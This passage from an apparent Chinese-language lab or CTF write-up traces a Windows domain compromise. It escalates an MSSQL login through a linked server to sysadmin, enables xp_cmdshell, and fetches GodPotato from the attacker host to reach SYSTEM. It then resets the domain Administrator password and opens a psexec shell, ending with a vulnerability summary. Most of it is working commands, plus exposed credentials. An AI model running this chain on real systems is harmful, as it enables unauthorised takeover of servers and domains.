+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_CONFIG</font>`<font style="color:rgb(51, 51, 51);"> 执行时只是普通低权限上下文。</font>
+ <font style="color:rgb(51, 51, 51);">真正有价值的是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);">，它把当前请求映射到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa / dbo</font>`<font style="color:rgb(51, 51, 51);">。</font>

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">这里已经找到了从普通 SQL 登录跳到高权限 SQL 上下文的关键跳板。</font>

### <font style="color:rgb(51, 51, 51);">4.4 把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`<font style="color:rgb(51, 51, 51);"> 提成 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`
<font style="color:rgb(51, 51, 51);">关键命令：</font>

& .\invoke_sql_query.ps1 -Query "EXEC ('EXEC master..sp_addsrvrolemember ''wuwupor'', ''sysadmin''') AT [POO_PUBLIC]" -ConnectionTimeout 20

<font style="color:rgb(51, 51, 51);">随后复查：</font>

& .\invoke_sql_query.ps1 -Query "select SYSTEM_USER as login_name, USER_NAME() as db_user, IS_SRVROLEMEMBER('sysadmin') as is_sysadmin" -ConnectionTimeout 20

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`<font style="color:rgb(51, 51, 51);"> 变为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dbo</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">IS_SRVROLEMEMBER('sysadmin') = 1</font>`

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">至此，SQL 低权限登录被稳定提到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);">。</font>

### <font style="color:rgb(51, 51, 51);">4.5 开启 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 并验证系统命令上下文</font>
<font style="color:rgb(51, 51, 51);">关键命令：</font>

```plain
& .\invoke_sql_query.ps1 -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" -ConnectionTimeout 20
& .\invoke_xpcmd.ps1 -Command 'whoami' -ConnectionTimeout 20
```

<font style="color:rgb(51, 51, 51);">关键结果：</font>

xmcve\sqlsvc

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">SQL Server 系统命令是以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 身份执行。</font>
+ <font style="color:rgb(51, 51, 51);">这和离线取证得到的 SQL 服务账号完全对上。</font>

## <font style="color:rgb(51, 51, 51);">5. 从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`
<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">serve_blob_tcp.ps1</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_xpcmd.ps1</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">stage_godpotato.ps1</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_godpotato_system.ps1</font>`

<font style="color:rgb(51, 51, 51);">目的：从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 进一步提到本机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">。</font>

<font style="color:rgb(51, 51, 51);">为什么选 GodPotato：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">whoami /priv</font>`<font style="color:rgb(51, 51, 51);"> 显示 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 拥有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Spooler</font>`<font style="color:rgb(51, 51, 51);"> 服务未运行，所以没有优先走 PrintSpoofer</font>
+ <font style="color:rgb(51, 51, 51);">这类环境更适合直接走 GodPotato</font>

### <font style="color:rgb(51, 51, 51);">5.1 为什么最终没有采用“源码远程编译”</font>
<font style="color:rgb(51, 51, 51);">尝试过的辅助脚本：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">stage_godpotato.ps1</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_godpotato_system.ps1</font>`

<font style="color:rgb(51, 51, 51);">尝试思路：</font>

+ <font style="color:rgb(51, 51, 51);">把 GodPotato 源码下发到靶机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">%TEMP%\gp</font>`
+ <font style="color:rgb(51, 51, 51);">用靶机自带 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">csc.exe</font>`<font style="color:rgb(51, 51, 51);"> 编译</font>

<font style="color:rgb(51, 51, 51);">结果：</font>

+ <font style="color:rgb(51, 51, 51);">靶机编译器较老，编译 GodPotato 源码时报错，例如：</font>

error CS1056: Unexpected character '$'

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">“源码下发 + 靶机本地编译”不是最终稳定方案。</font>
+ <font style="color:rgb(51, 51, 51);">真正稳定的方案是直接下发编译好的二进制。</font>

### <font style="color:rgb(51, 51, 51);">5.2 用内存 HTTP 服务给靶机下发 GodPotato</font>
<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">serve_blob_tcp.ps1</font>`

<font style="color:rgb(51, 51, 51);">目的：让宿主机只在内存里代理 GodPotato 二进制，避免文件直接落盘在本机被清理。</font>

<font style="color:rgb(51, 51, 51);">关键命令：</font>

powershell -ExecutionPolicy Bypass -File .\serve_blob_tcp.ps1 -Bind 192.168.56.1 -Port 8001

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ <font style="color:rgb(51, 51, 51);">宿主机在 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">http://192.168.56.1:8001/gp.exe</font>`<font style="color:rgb(51, 51, 51);"> 提供 GodPotato 二进制</font>
+ <font style="color:rgb(51, 51, 51);">靶机可以通过 Host-Only 网络直接下载</font>

### <font style="color:rgb(51, 51, 51);">5.3 通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 下载二进制到靶机</font>
<font style="color:rgb(51, 51, 51);">关键命令：</font>

& .\invoke_xpcmd.ps1 -Command 'powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing http://192.168.56.1:8001/gp.exe -OutFile $env:TEMP\svcmon.exe; Get-Item $env:TEMP\svcmon.exe | Select-Object Name,Length | Format-Table -AutoSize"' -ConnectionTimeout 20

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">%TEMP%\svcmon.exe</font>`<font style="color:rgb(51, 51, 51);"> 成功落到靶机</font>
+ <font style="color:rgb(51, 51, 51);">文件长度为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">57344</font>`<font style="color:rgb(51, 51, 51);"> 字节</font>

### <font style="color:rgb(51, 51, 51);">5.4 触发 GodPotato 提权并验证 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`
<font style="color:rgb(51, 51, 51);">关键命令：</font>

```plain
& .\invoke_xpcmd.ps1 -Command '%TEMP%\svcmon.exe -cmd "cmd /c whoami /all > C:\Users\sqlsvc\AppData\Local\Temp\gpwho.txt"' -ConnectionTimeout 20
& .\invoke_xpcmd.ps1 -Command 'cmd /c type C:\Users\sqlsvc\AppData\Local\Temp\gpwho.txt' -ConnectionTimeout 20
```

<font style="color:rgb(51, 51, 51);">关键结果：</font>

```plain
User Name           SID
=================== ========
nt authority\system S-1-5-18
```

<font style="color:rgb(51, 51, 51);">同时 GodPotato 过程日志里还能看到：</font>

```plain
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3896
```

<font style="color:rgb(51, 51, 51);">结论：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 已经被稳定提升为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">。</font>

## <font style="color:rgb(51, 51, 51);">6. 从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`
<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_xpcmd.ps1</font>`<font style="color:rgb(51, 51, 51);">、PowerShell WMI</font>

<font style="color:rgb(51, 51, 51);">目的：利用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 权限直接控制域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);">。</font>

### <font style="color:rgb(51, 51, 51);">6.1 用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 重置域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 密码</font>
<font style="color:rgb(51, 51, 51);">关键命令：</font>

```plain
& .\invoke_xpcmd.ps1 -Command '%TEMP%\svcmon.exe -cmd "cmd /c net user Administrator Xmcve#2026! /domain > C:\Users\sqlsvc\AppData\Local\Temp\setadmin.txt 2>&1"' -ConnectionTimeout 20
& .\invoke_xpcmd.ps1 -Command 'cmd /c type C:\Users\sqlsvc\AppData\Local\Temp\setadmin.txt' -ConnectionTimeout 20
```

<font style="color:rgb(51, 51, 51);">关键结果：</font>

The command completed successfully.

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 密码已经被成功改为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Xmcve#2026!</font>`<font style="color:rgb(51, 51, 51);">。</font>

### <font style="color:rgb(51, 51, 51);">6.2 用 WMI 验证管理员上下文</font>
<font style="color:rgb(51, 51, 51);">目的：证明这组新凭据真的能以管理员身份在远端创建进程，而不是只停留在“理论上应当可用”。</font>

<font style="color:rgb(51, 51, 51);">关键命令：</font>

```plain
$sec = ConvertTo-SecureString 'Xmcve#2026!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('XMCVE\Administrator', $sec)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami > C:\inetpub\wwwroot\adminshell.txt' -ComputerName 192.168.56.101 -Credential $cred
(Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168.56.101/adminshell.txt').Content
```

<font style="color:rgb(51, 51, 51);">关键结果：</font>

xmcve\administrator

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">这里已经拿到了经过现场验证的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 远程命令执行。</font>
+ <font style="color:rgb(51, 51, 51);">这一步本身就已经足以证明管理员权限被完全接管。</font>

## <font style="color:rgb(51, 51, 51);">7. 最终交互 shell 落地</font>
<font style="color:rgb(51, 51, 51);">工具：Impacket </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec.py</font>`

<font style="color:rgb(51, 51, 51);">目的：把已经验证可用的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 凭据落成真正交互 shell。</font>

<font style="color:rgb(51, 51, 51);">前提：</font>

+ <font style="color:rgb(51, 51, 51);">已知管理员凭据：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\Administrator / Xmcve#2026!</font>`
+ <font style="color:rgb(51, 51, 51);">目标 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445/tcp</font>`<font style="color:rgb(51, 51, 51);"> 开放</font>
+ <font style="color:rgb(51, 51, 51);">前面已经通过 WMI 验证过该管理员凭据真实有效</font>

<font style="color:rgb(51, 51, 51);">关键命令：</font>

psexec.py XMCVE/Administrator:'Xmcve#2026!'@192.168.56.101 cmd.exe

<font style="color:rgb(51, 51, 51);">说明：</font>

+ <font style="color:rgb(51, 51, 51);">这一步就是把“已验证的 Administrator 远程命令执行”进一步落成交互式 shell。</font>
+ <font style="color:rgb(51, 51, 51);">如果提交时更强调“已现场证明”，那么上一节的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">adminshell.txt -> xmcve\administrator</font>`<font style="color:rgb(51, 51, 51);"> 已经是强证据。</font>
+ <font style="color:rgb(51, 51, 51);">如果提交时更强调“完整 shell 终点”，则这一条 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec.py</font>`<font style="color:rgb(51, 51, 51);"> 就是最后一步。</font>

## <font style="color:rgb(51, 51, 51);">8. 总结与漏洞点</font>
<font style="color:rgb(51, 51, 51);">整条利用链可以概括为：</font>

1. <font style="color:rgb(51, 51, 51);">Web 面本身很薄，但离线分析 Web 根目录发现数据库连接串泄露，直接拿到 MSSQL 明文凭据 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`<font style="color:rgb(51, 51, 51);">。</font>
2. <font style="color:rgb(51, 51, 51);">用该凭据登录 MSSQL 后发现 linked server </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 映射到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa / dbo</font>`<font style="color:rgb(51, 51, 51);">，从而把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`<font style="color:rgb(51, 51, 51);"> 横向提到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);">。</font>
3. <font style="color:rgb(51, 51, 51);">开启 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 后，系统命令以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 身份执行。</font>
4. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 拥有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`<font style="color:rgb(51, 51, 51);">，借助 GodPotato 直接提到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NT AUTHORITY\SYSTEM</font>`<font style="color:rgb(51, 51, 51);">。</font>
5. <font style="color:rgb(51, 51, 51);">以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 重置域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 密码，再用新密码完成管理员远程命令执行与最终交互 shell 落地。</font>

<font style="color:rgb(51, 51, 51);">最终漏洞点有三处：</font>

### <font style="color:rgb(51, 51, 51);">漏洞点 1：Web 根目录泄露 SQL 明文连接凭据</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\inetpub\wwwroot\poo_connection.txt</font>`
+ <font style="color:rgb(51, 51, 51);">暴露了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`

### <font style="color:rgb(51, 51, 51);">漏洞点 2：MSSQL linked server </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 映射到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa</font>`
+ <font style="color:rgb(51, 51, 51);">低权限 SQL 登录可以通过 linked server 直接在远端以上下文 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa / dbo</font>`<font style="color:rgb(51, 51, 51);"> 执行语句</font>
+ <font style="color:rgb(51, 51, 51);">最终导致 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);"> 提权</font>

### <font style="color:rgb(51, 51, 51);">漏洞点 3：SQL 服务账号 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 拥有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 落地为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 可借 GodPotato 提权为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 可直接控制域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`

<font style="color:rgb(51, 51, 51);">至此，完整链路为：</font>

```plain
信息搜集
-> 离线取证拿到 SQL 连接串
-> MSSQL 登录
-> linked server 映射到 sa
-> 提升 wuwupor 为 sysadmin
-> 开启 xp_cmdshell
-> 命令执行落到 sqlsvc
-> GodPotato 提到 SYSTEM
-> SYSTEM 重置 Administrator 密码
-> Administrator 远程命令执行
-> psexec.py 落交互 shell
```

